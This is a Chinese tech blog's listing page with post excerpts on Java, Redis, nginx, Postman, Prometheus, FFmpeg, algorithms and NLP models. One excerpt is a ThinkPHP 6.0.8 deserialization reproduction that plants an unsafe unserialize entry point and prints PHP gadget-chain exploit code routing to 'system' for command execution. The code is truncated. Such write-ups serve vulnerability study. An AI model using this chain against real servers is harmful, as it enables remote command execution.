也就是说，ODConv添加了卷积核的空间维度、输入通道维度以及输出通道维度的特征学习。
动态卷积和注意力机制虽然都可以提高神经网络的性能，但其作用不同。动态卷积是加强了特征的适应性，而注意力机制则是更好地关注当前任务需要的信息。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f02df098517431d3ae7d316512b8b44/" rel="bookmark">
			java：解决报错非法字符: ‘\ufeff‘以及什么是BOM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 运行 JAVA 项目后，报错提示：非法字符: '\ufeff'，如图：
但是我在这个报错的文件中并没有搜到这个字符，那到底是什么原因
什么是BOM BOM（Byte Order Mark），隐藏字符，字节顺序标记，出现在文本文件头部，用于标识文件是采用哪种格式的编码。
类似WINDOWS自带的记事本等软件，在保存一个以UTF-8编码的文件时，会在文件开始的地方插入三个不可见的字符（0xEF 0xBB 0xBF，即BOM）。它是一串隐藏的字符，用于让记事本等编辑器识别这个文件是否以UTF-8编码。对于一般的文件，这样并不会产生什么麻烦。但对于 PHP、JAVA等来说，就会识别为非法字符。
Linux下的编辑器应该都没有这个问题。WINDOWS下，请勿使用记事本等编辑器。
解决 选中报错的文件，在 IDEA 右下角点击 UTF-8，再点击 Remove BOM，就可以啦
全局设置的时候也要禁用掉
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/451bb6fecd974a4f4e647d97fe8b44a1/" rel="bookmark">
			DBeaver 离线安装驱动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前提：DBeaver 已经下载安装好，一台机器可以联网并下载好了驱动，一台机器不能联网。
1 联网机器
窗口--首选项--连接--驱动--找到驱动位置本地文件夹位置--压缩为drivers.rar.
2 不联网机器
窗口--首选项--连接--驱动--"找到驱动位置本地文件夹位置--删除drivers文件夹--解压拷贝过来的drivers.rar.
3 完成。
说明：这个方法好像对 两台电脑系统和版本有要求，试过 32位的好像不行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b837da7017ede04536f10bba7b534298/" rel="bookmark">
			k8s nginx&#43;ingress 配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 nginx&gt; ingress 配置：
2 nginx &gt;service 配置
3 nginx pod配置：
4 nginx.conf 配置文件：
# web端v1 server { listen 30006; add_header Strict-Transport-Security "max-age=31536000; includeSubDomains"; #add_header Content-Security-Policy "default-src 'self' http://test123.realize.cn; font-src 'self' data:; script-src unsafe-inline; script-src-elem unsafe-inline"; add_header X-XSS-Protection "1; mode=block"; add_header X-Frame-Options "SAMEORIGIN always"; add_header X-Content-Type-Options "nosniff"; # 转发websocket需要的设置 proxy_set_header X-Real_IP $remote_addr; proxy_set_header Host $host; proxy_set_header X_Forward_For $proxy_add_x_forwarded_for; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection 'upgrade'; location / { proxy_pass http://frontdongmi-official-v1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b837da7017ede04536f10bba7b534298/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8852d16528e8e50f21622d3405c0c7c8/" rel="bookmark">
			redis发布订阅模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 发布与订阅1.频道订阅和退订1.1订阅频道`subscribe`**伪代码** 1.2 退订频道伪代码 2.模式订阅和退订2.1订阅模式`psubscribe`2.2 退订模式 3.发送消息3.1 消息发送频道订阅者伪代码 3.2消息发送模式订阅者伪代码 总结的Publish4.查看订阅消息4.1 `pubsub channels`4.2 `pubsub numsub`伪代码 4.3 `pubsub numpat`伪代码 5.回顾 发布与订阅 Redis的发布订阅基于publish,subscribe,psubscribe
订阅
subscribe "news.it" 发布
publish "news.it" "hello" 订阅
发布
订阅的状态的推进
向new.it发送消息
1.频道订阅和退订 Redis订阅关系保存在服务器状态的pubsub_channels字典
key为channel, value为链表，链表上有订阅该频道的Client
struct redisServer{ //... //保存频道的订阅关系 dict *pubsub_channels //... } 如图所示
1.1订阅频道subscribe Client订阅pubsub_channels有两种情况
频道有其他订阅者,把value添加到链表尾部没有订阅者，就把先创建key再添加value subscribe "news.sport" "news.movie" 伪代码 def subscribe (*all input channels): # 遍历输入的所有频道 for channel in all input channels: # 如果channel 不存在于pubsub channels 字典（没有任何订间者） # 那么在宇典中添加channel 键，井设置它的值为空链表 if channel not in server.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8852d16528e8e50f21622d3405c0c7c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24ca632d366a082af25b0dbb1b624835/" rel="bookmark">
			前端项目时因chunk-vendors过大导致首屏加载太慢，Vue Build时chunk-vendors的优化方案...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、compression-webpack-plugin插件打包.gz文件 安装插件 也可以指定版本 我这里下载的是1.1.2版本的，试过更高的版本会有ES6语法的报错，因为我node使用的是v12，如果node版本更高可以尝试更高版本
npm install --save-dev compression-webpack-plugin npm install --save-dev compression-webpack-plugin@1.1.2 或者 yarn add compression-webpack-plugin --save-dev 解决 TypeError: Cannot read property ‘tapPromise‘ of undefined 在使用 compression-webpack-plugin 插件时报这个错误，原因是版本问题。 ERROR TypeError: Cannot read property 'tapPromise' of undefined TypeError: Cannot read property 'tapPromise' of undefined 安装插件的时候默认最新版本，但是可能脚手架还不支持这个版本，所以需要降低插件版本进行使用，这边在安装的时候最新版本为 v9.2.0，降到 v6.1.1 进行使用 npm install compression-webpack-plugin@6.1.1 vue.config.js配置插件 module.exports = { chainWebpack: config =&gt; { const CompressionWebpackPlugin = require('compression-webpack-plugin') if (process.env.NODE_ENV === 'production') { config.plugin('CompressionPlugin').use( new CompressionWebpackPlugin({ test: /\.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24ca632d366a082af25b0dbb1b624835/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6484428aef718614bb118cc2630cecd2/" rel="bookmark">
			ThinkPHP v6.0.8 CacheStore 反序列化漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		漏洞说明 1. 漏洞原理：ThinkPHP 6.0.8 CacheStore 会触发POP利用链子，造成任意命令执行
2. 组件描述： ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架
3. 影响版本：V6.0.8
漏洞复现 1. 环境安装：ThinkPHP6.0正式完整版下载_其他_技术博文_js代码
下载v6.0.8，使用命令php think run即环境起来了
访问127.0.0.1:8000
需要在源代码中加入一个入口
if(isset($_POST['data'])) { @unserialize($_POST['data']); } highlight_string(file_get_contents(__FILE__)); 利用exp生成payload并打入data入口
&lt;?php namespace League\Flysystem\Cached\Storage { abstract class AbstractCache { protected $autosave; public function __construct() { $this-&gt;autosave = false; } } } namespace think\filesystem { use League\Flysystem\Cached\Storage\AbstractCache; use think\cache\driver\File; class CacheStore extends AbstractCache { protected $store; protected $expire; protected $key; public function __construct() { $this-&gt;store = new File(); $this-&gt;expire = 1; $this-&gt;key = '1'; } } echo urlencode(serialize(new CacheStore())); } namespace think\cache { use think\model\Pivot; abstract class Driver { protected $options = [ 'expire' =&gt; 0, 'cache_subdir' =&gt; true, 'prefix' =&gt; '', 'path' =&gt; '', 'hash_type' =&gt; 'md5', 'data_compress' =&gt; false, 'tag_prefix' =&gt; 'tag:', 'serialize' =&gt; ['system'], ]; public function __construct() { $this-&gt;options = [ 'expire' =&gt; 0, 'cache_subdir' =&gt; true, 'prefix' =&gt; '', 'path' =&gt; new Pivot(), 'hash_type' =&gt; 'md5', 'data_compress' =&gt; false, 'tag_prefix' =&gt; 'tag:', 'serialize' =&gt; ['system'], ]; } } } namespace think\cache\driver { use think\cache\Driver; class File extends Driver { } } namespace think { use think\model\concern\Attribute; abstract class Model { private $data = []; private $withAttr = []; public function __construct() { $this-&gt;data = ['errorr0' =&gt; 'calc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6484428aef718614bb118cc2630cecd2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/038c459c2959dbf13c9cbde537186846/" rel="bookmark">
			爆肝整理，Postman接口测试-参数关联实战（详细步骤）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录：导读 前言一、Python编程入门到精通二、接口自动化项目实战三、Web自动化项目实战四、App自动化项目实战五、一线大厂简历六、测试开发DevOps体系七、常用自动化测试工具八、JMeter性能测试九、总结（尾部小惊喜） 前言 接口测试什么时候需要进行参数关联？
上个接口返回的数据需要作为下个接口的参数或请求头时就需要进行参数关联，也就是相互有依赖的接口就需要参数关联
参数关联的2种方式
1、创建两个接口，在前一个接口的Test里面获取到返回数据并保存为全局变量或环境变量，然后再引用到下个接口中，作为入参，此时由于两个接口有关联关系，所以两个接口要顺序执行才能互相之间传递数据。
2、创建一个接口，在当前请求发送前先在Pre-request Script 中发送一下所依赖的请求，获取接口返回保存为全局变量或环境变量，然后在接口需要(如Header)的地方进行引用
例如：很多系统都需要登录成功后才能进行其他操作，所以登录接口需返回token，作为下个接口的参数，下图是我抓包得到的一个查询接口信息
通过上面信息发现这个接口需要token值才能发送成功，所以我需要先去拿到登录的token值
登录接口返回Body消息如下，他是json格式的：
{ "code": 0, "msg": "success", "data": { "token": "53a43036d5d6f132c86720a735bf106a", "expire": 27141 } } 方式1
在登录接口的Tests中输入以下代码：
var responseData = JSON.parse(responseBody);//把responseBody的内容转化成json格式存储在responseData 里面 token=responseData.data.token//获取token的值 pm.environment.set("Token",token) //将token设置为环境变量Token 然后在需要使用token的接口中如查询接口，用{{Token}}代替对应值就行
方式2
在当前查询接口的Pre-request Script 中发送登录接口并获取接口返回token值保存为一个环境变量
//定义post的参数 var paramdata = { "_t":"1619059684163", "password":"****", "platformType":"1", "systemCode":"dcp-adm", "username":"***" } //const定义一个post请求常量 const loginRequest = { url: 'http://127.0.0.1:14444/user/login', method: 'POST', header: {'Content-Type':'application/json;charset=utf-8', 'Accept': 'application/json;charset=utf-8' }, body: //请求体信息，请求body中携带的参数 { mode: 'raw', raw: JSON.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/038c459c2959dbf13c9cbde537186846/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc0dc46bf0ad9d088211eac949ff6dc8/" rel="bookmark">
			Prometheus(一)介绍和部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里写自定义目录标题 一、概述1 介绍2 特征3 什么是指标4 组件 二、 架构适用场景不适用的场景 三 部署1 二进制方式1.1 下载 [点击官方下载链接](https://prometheus.io/download/)1.2 解压到指定目录1.3 启动命令和启动参数1.3.1 启动命令1.3.2 启动参数 1.4 为程序配置 systemd ，实现开机自启 2 docker 容器方式3 配置文件3.1 示例配置文件3.2 配置文件详解热加载配置文件命令 四 页面功能菜单介绍 一、概述 1 介绍 Prometheus是一个开源系统监控和警报工具包，最初在SoundCloud上构建。自2012年成立以来，许多公司和组织都采用了Prometheus，该项目拥有非常活跃的开发人员和用户社区。它现在是一个独立的开源项目，独立于任何公司进行维护。为了强调这一点，并澄清项目的治理结构，Prometheus于2016年加入了云原生计算基金会，成为继Kubernetes之后的第二个托管项目。
Prometheus将其指标收集并存储为时间序列数据，即指标信息与记录它的时间戳一起存储，以及称为标签的可选键值对。
2 特征 普罗米修斯的主要特点是：
具有由指标名称和键/值对标识的时间序列数据的多维数据模型PromQL，一种灵活的查询语言，可利用这种维度不依赖分布式存储;单个服务器节点是自治的时序收集通过 HTTP 上的拉取模型进行通过中间网关支持推送时间序列通过服务发现或静态配置发现目标多种模式的绘图和仪表板支持 3 什么是指标 通俗地说，指标是用于测量的数字。时间序列意味着随时间记录的变化。用户想要测量的内容因应用程序而异。对于Web服务器，它可能是请求时间，对于数据库，它可能是活动连接数或活动查询数等。
指标在理解应用程序以某种方式工作的原因方面起着重要作用。假设您正在运行一个 Web 应用程序，并发现该应用程序运行缓慢。您将需要一些信息来了解您的应用程序发生了什么。例如，当请求数较高时，应用程序可能会变慢。如果您有请求计数指标，则可以发现原因并增加服务器数量以处理负载。
4 组件 普罗米修斯生态系统由多个组件组成，其中许多组件是可选的：
Prometheus server 主要组件，用于抓取和存储时间序列数据client libraries， 用于检测应用程序代码Push gateway 支持短期作业的推送Exporters，用于监控特殊服务，如HAProxy，StatsD，Graphite等服务。alertmanager 用于处理警报各种支持工具
大多数Prometheus组件都是用Go编写的，这使得它们易于构建和部署为静态二进制文件。 二、 架构 Prometheus server 直接从监控任务进程中拉取监控指标，也可以通过其他程序或脚本，将监控数据推送 Pushgateway,之后 Prometheus server 再从 Pushgateway 中拉取指标。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc0dc46bf0ad9d088211eac949ff6dc8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/275a463417abf7f1e7e9dbf2a6b3e635/" rel="bookmark">
			【刷题打卡记录】力扣17. 电话号码的字母组合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/**
Note: The returned array must be malloced, assume caller calls free().
*/
#define LEN 300
int g_len;
char **res;
char *path;
int ansSize;
int pathSize; char g_map[10][5] = {
“”, “”, “abc”, “def”, “ghi”, “jkl”, “mno”, “pqrs”, “tuv”, “wxyz”
};
void backTrace(int idx, char *digits)
{
if (idx == g_len) {
char *tmp = (char *)malloc(sizeof(char) * (g_len + 1));
for (int i = 0; i &lt; g_len; i++) {
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/275a463417abf7f1e7e9dbf2a6b3e635/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36c1efb125932e85e4264015560f9244/" rel="bookmark">
			C&#43;&#43; 在线刷题网站
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 前言2. 效果展示3. 框架4. common4.1 工具类4.2 日志 5. 编译5.1 前言5.2 正文5.3 PathUtil5.4 Compile 6. 运行6.1 限制进程资源6.2 Run 7. 执行7.1 json7.2 Start 参数7.3 FileUtil7.4 Start 8. 启动服务8.1 安装 httplib8.2 compile_server.cpp 9. 测试 compiler10. 梳理题目逻辑11. 建表12. 连接数据库12.1 MySQL 库12.2 查询操作 13. 题目页面13.1 ctemplate13.2 前端题库页面13.3 接收请求 14. 单个题目15. 负载均衡15.1 Machine15.2 LoadBalancer 15. 运行用户代码16. 密码密文存储17. 实现会话18. 拦截器19. 记录用户答题情况20. 展示用户完成的题目21. 项目代码 1. 前言 环境：CentOS 7.6
项目：在线刷题网站，是一个类似于「力扣」那样的刷题网站
项目基本功能：和力扣的核心功能一样，需要完成用户代码的编译，运行，跑测试用例，并将用户代码的执行结果返回给用户
所涉及库：除了一些基础库之外，还用到了
Boost 标准库，使用了操作字符串，时间戳，uuid 相关接口cpp-httplib：开源网络库，简化开发，不需要再写客户端服务端的套接字等繁琐代码ctemplate：开源库，用来渲染前端页面jsoncpp：开源库，用于序列化和反序列化MySQL C connect：用于操作数据库Ace 代码编辑器 亮点：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36c1efb125932e85e4264015560f9244/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83460edd11c1376826646744054ee02b/" rel="bookmark">
			FFmpeg下载安装及Windows开发环境设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 FFmpeg简介 FFmpeg：FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。采用LGPL或GPL许可证。它提供了录制、转换以及流化音视频的完整解决方案。项目的名称来自MPEG视频编码标准，前面的"FF"代表"Fast Forward"。——百度百科
2 FFmpeg下载及安装 2.1 下载 FFmpeg官网下载页面：https://ffmpeg.org/download.html。
如果对使用或平台等有特殊要求，可以下载源码，自己编译。
如果只是通常使用，官网已提供了一些编译好的库可以直接用，以上页面鼠标指向Windows图标，然后选择链接进入，我一般是进入Windows builds by BtbN，进入后，可以看到很多版本的库，目前最新版本是6.0，我选择下载的是ffmpeg-master-latest-win64-gpl-shared.zip，也可以选择下载早期版本的库。
2.2 安装 这个包里包含了FFmpeg 64位版本的bin、include、lib文件，可以用来进行64位应用程序开发，下载后，解压到适合的地方，例如我直接解压到F:\。
为了方便使用，把解压后的bin目录添加进系统的Path变量里。
3 FFmpeg编译器开发环境设置 3.1 VS系列编译器 如果使用VS2015、VS2017等微软系列编译器，在要加入FFmpeg的工程的属性页里：
首先，设置C/C+±常规-附加包含目录，把FFmpeg的include目录添加进去
第二，设置链接器-常规-附加库目录，把FFmpeg的lib目录添加进去
第三，在链接器-输入-附加依赖项中添加要用到的FFmpeg的lib，这个一般看你需要用到什么函数，如果不确定，可以至少添加以下几个：
avcodec.lib avformat.lib avutil.lib swscale.lib avfilter.lib avdevice.lib postproc.lib swresample.lib 3.2 Qt系列编译器 如果使用的是qt编译器，直接在项目的pro文件中添加，同样，lib要添加哪些，看具体用到哪些函数，以下这些一般功能都包含了：
INCLUDEPATH += F:/ffmpeg-master-latest-win64-gpl-shared/include LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/avcodec.lib LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/avformat.lib LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/avutil.lib LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/swscale.lib LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/avfilter.lib LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/avdevice.lib LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/postproc.lib LIBS += F:/ffmpeg-master-latest-win64-gpl-shared/lib/swresample.lib 4 代码中的include 代码包含相应FFmpeg头文件时，要注意一点，由于目前大多数都使用C++来编写代码，而FFmpeg库是用C编写的，所以在CPP文件中要用C兼容方法包含：
#ifdef __cplusplus extern "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83460edd11c1376826646744054ee02b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d710d4f03825810e29455f92b178a30/" rel="bookmark">
			算法题--找规律（构建乘积数组、剪绳子、圆圈中最后剩下的数字）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
找规律
构建乘积数组
原题链接
解析 核心思想
答案
剪绳子
原题链接
解析
核心思想
答案
圆圈中最后剩下的数字
原题链接
解析
核心思想
答案 找规律 需要通过列举多个示例，从多个示例的输入到输出中得到规律去普遍化。
构建乘积数组 给定一个数组 A[0,1,…,n-1]，请构建一个数组 B[0,1,…,n-1]，其中 B[i] 的值是数组 A 中除了下标 i 以外的元素的积, 即 B[i]=A[0]×A[1]×…×A[i-1]×A[i+1]×…×A[n-1]。不能使用除法。
示例:
输入: [1,2,3,4,5] 输出: [120,60,40,30,24] var constructArr = function(a) { }; 原题链接 力扣
解析 注意for循环的第一步中mul*=a[i]，第一次执行循环体的时候不会执行，第二次循环前会先执行再i++。
核心思想 以示例为例构建5位数组arr每位等于i-1的累乘[1,1,2,6,24]，此时最后一位即对应答案，前一位需要乘5，再前一位需要乘5*4，再前一位需要乘5*4*3，再前一位需要乘5*4*3*2。
答案 var constructArr = function(a) { const res = [] for (let i = 0, mul = 1; i &lt; a.length; mul *= a[i], i++) { res[i] = mul } for (let i = a.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d710d4f03825810e29455f92b178a30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbca27187a8eb6f1e22cf6b21598fbe4/" rel="bookmark">
			Transformer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Transformer
引言：（补充）
用于机器翻译的transformer结构如下，由编码器组件和解码器组件构成。
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-nHN4LNRR-1624956718031)(C:\Users\sfang.fangsh\AppData\Roaming\Typora\typora-user-images\image-20200616171932170.png)]
如上图，编码器组件有一系列编码器堆砌组成，解码器组件也是由一系列的解码器堆砌组成（上图各6个）。transformer的编码器和解码器是其核心组成，理解力编码器和解码器也就理解了transformer。
1 编码器和解码器
Encoder和Decoder的结构不同，Encoder主要由两部分组成：self-Attention和两层的前馈神经网络组成。Decoder有三部分组成：self-Attention，Encoder-Decoder Attention（类似seq2seq的attention机制），两层的前馈神经网络层。
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-PVVsXl6c-1624956718033)(C:\Users\sfang.fangsh\AppData\Roaming\Typora\typora-user-images\image-20200616172232714.png)]
2 编码器Encoder
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ehwPkCQx-1624956718034)(C:\Users\sfang.fangsh\AppData\Roaming\Typora\typora-user-images\image-20200616172642821.png)]
encoder的输入是字嵌入+位置编码：
2.1 self attention
self attention是多头的注意力机制。假设head的个数是8，其计算方法是：
(1) 计算词嵌入向量和位置编码，相加得到输入X
X = w o r d _ e m b e d d i n g + p o s i t i o n a l _ e n c o d i n g X = word\_embedding + positional\_encoding X=word_embedding+positional_encoding
(2) 计算每个头的Q,K,V矩阵
Q i = X W i Q , K i = X W i K , V i = X W i V Q_i=XW_i^Q,\qquad K_i=XW_i^K,\qquad V_i=XW_i^V Qi​=XWiQ​,Ki​=XWiK​,Vi​=XWiV​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbca27187a8eb6f1e22cf6b21598fbe4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c8ab31075ac969b23716e67fedc56314/" rel="bookmark">
			中文NER方法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		中文NER方法总结 ​ 中文命名实体识别主要有四大主流算法，序列标注，指针网络，多头标注，片段排列。
1. 四大抽取算法 1.1 序列标注 ​ 最简单的softmax+CE的方法，是一种token级别的分类任务。这种方法最简单，但没有考虑到标签之间的关系。仅仅在特征提取时，上后文是有联系的，每个时刻分类时，互不相关，这样就会出现很不合理的预测，如BB等。
在每一个位置使用softmax进行 2 C + 1 2C+1 2C+1分类（如果使用BIO标注格式的话，C为类别总数）。
​ 基于CRF的模型在softmax+CE上做改进，预测时会考虑标签之间的联系。CRF也存在局限性，序列标注表示为线性链的条件随机场。仅仅假设相邻的两个节点存在联系，不相邻节点时条件无关的（也就是马尔科夫随机场定义中的局部/全局的马尔科夫性）。在前端网络考虑各时刻token的关联性，在crf考虑标签的关联性，两部分分开。
1.2 指针网络 对每个span的start和end进行标记，如果是多片段抽取就转化成L个2分类（L为序列长度）。如果涉及多标签可以转化成层叠式指针网络（C个指针网络，C为类别总数）。
单片段抽取 如果每个输入只有一个片段需要抽取，只需要设计两个L分类的输出分别预测start_ids和end_ids。将每个位置看做一个类别。使用softmax 搭建两个L分类。
多片段抽取-sigmoid 如果一句话有多个片段需要抽取（同样的每个位置看做是一个类别），那么start和end都要分得多个标签上，也就是多任务分类。将softmax改为sigmoid即可。序列的每个位置都做0-1二分类。
多标签抽取 上面的情形都是只有一种标签需要抽取，如上面的部位，如果同时需要抽取多个标签，则需要在序列每个token位置做 C + 1 C+1 C+1分类（C表示总类别数）。
1.3 多头标注 多头标注(multi-head)构建一个 L × L × ( C + 1 ) L\times L\times (C+1) L×L×(C+1)的span矩阵(C类外加None)。如下图， s p a n { 呼 } { 枢 } = 1 span\{呼\}\{枢\}=1 span{呼}{枢}=1表示[呼吸中枢]是一个部位实体。 s p a n { 呼 } { 累 } = 2 span\{呼\}\{累\}=2 span{呼}{累}=2表示[呼吸中枢受累]是一个症状实体。多头标注的重点在于如何构造span矩阵，如何解决0-1标签稀疏问题。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c8ab31075ac969b23716e67fedc56314/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0373a8dce6ff5920475a25eb8910349/" rel="bookmark">
			【LSTM分类】基于注意力机制的卷积神经网络结合长短记忆神经网络CNN-LSTM-attention实现数据分类附matlab代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 ✅作者简介：热爱科研的Matlab仿真开发者，修心和技术同步精进，matlab项目合作可私信。
🍎个人主页：Matlab科研工作室
🍊个人信条：格物致知。
更多Matlab仿真内容点击👇
智能优化算法 神经网络预测 雷达通信 无线传感器 电力系统
信号处理 图像处理 路径规划 元胞自动机 无人机 ⛄ 内容介绍 ​在当今信息爆炸的时代，数据分类成为了一个非常重要的任务。无论是在自然语言处理、图像识别还是其他领域，我们都需要对数据进行准确的分类，以便更好地理解和利用这些数据。在过去的几年里，深度学习技术在数据分类任务中取得了巨大的成功，其中卷积神经网络（CNN）和长短记忆神经网络（LSTM）是两个备受关注的模型。
在本文中，我们将介绍一种基于注意力机制的卷积神经网络结合长短记忆神经网络（CNN-LSTM-attention）的方法，用于数据分类。这种方法结合了CNN在提取空间特征方面的优势和LSTM在建模时间序列数据方面的优势，并通过注意力机制来提高分类的准确性。
首先，让我们简要回顾一下CNN和LSTM的基本原理。CNN是一种专门用于处理具有网格结构数据（如图像）的神经网络。它通过卷积层提取图像的局部特征，并通过池化层减少参数数量和计算量。这使得CNN在图像识别任务中表现出色。而LSTM是一种用于处理序列数据的循环神经网络。它通过门控单元来记忆和遗忘过去的信息，并通过隐藏状态传递信息。这使得LSTM在语言建模和时间序列预测等任务中表现出色。
然而，传统的CNN和LSTM模型在某些数据集上可能存在一些问题。例如，在处理具有较长时间序列的数据时，LSTM可能会出现梯度消失或梯度爆炸的问题。而CNN则可能无法有效处理具有复杂空间结构的数据。为了解决这些问题，我们引入了注意力机制。
注意力机制是一种用于选择和集中关键信息的机制。在CNN-LSTM-attention模型中，我们通过引入注意力机制来选择重要的时间步长和空间位置。具体来说，我们使用卷积层提取图像的空间特征，并使用LSTM建模时间序列数据。然后，我们使用注意力机制来计算每个时间步长和空间位置的注意力权重。这些权重表示了该位置对于分类任务的重要性。最后，我们将注意力权重应用于LSTM的隐藏状态，以提高分类的准确性。
通过实验验证，我们发现CNN-LSTM-attention模型在多个数据集上都取得了优秀的分类结果。与传统的CNN和LSTM模型相比，CNN-LSTM-attention模型在处理具有长时间序列和复杂空间结构的数据时表现更好。这说明了注意力机制在提高数据分类准确性方面的重要性。
总之，基于注意力机制的卷积神经网络结合长短记忆神经网络（CNN-LSTM-attention）是一种有效的方法，用于数据分类任务。它充分利用了CNN和LSTM在空间和时间建模方面的优势，并通过注意力机制来提高分类的准确性。未来，我们可以进一步研究和改进这种方法，以适用于更多的数据分类任务。
⛄ 部分代码 function drawPath(path,G,flag)%%%%xGrid=size(G,2);drawShanGe(G,flag)hold onset(gca,'XtickLabel','')set(gca,'YtickLabel','')L=size(path,1);Sx=path(1,1)-0.5;Sy=path(1,2)-0.5;plot(Sx,Sy,'ro','MarkerSize',5,'LineWidth',5); % 起点for i=1:L-1 plot([path(i,2) path(i+1,2)]-0.5,[path(i,1) path(i+1,1)]-0.5,'k-','LineWidth',1.5,'markersize',10) hold onend​Ex=path(end,1)-0.5;Ey=path(end,2)-0.5;​plot(Ex,Ey,'gs','MarkerSize',5,'LineWidth',5); % 终点​ ⛄ 运行结果 ⛄ 参考文献 [1] 滕金保,孔韦韦,田乔鑫,等.基于CNN和LSTM的多通道注意力机制文本分类模型[J].计算机工程与应用, 2021, 57(23):154-162.DOI:10.3778/j.issn.1002-8331.2104-0212.
[2] 张昱,陈广书,李继涛,等.基于Attention机制的CNN-LSTM时序预测方法研究与应用[J].内蒙古大学学报:自然科学版, 2022, 53(5):6.
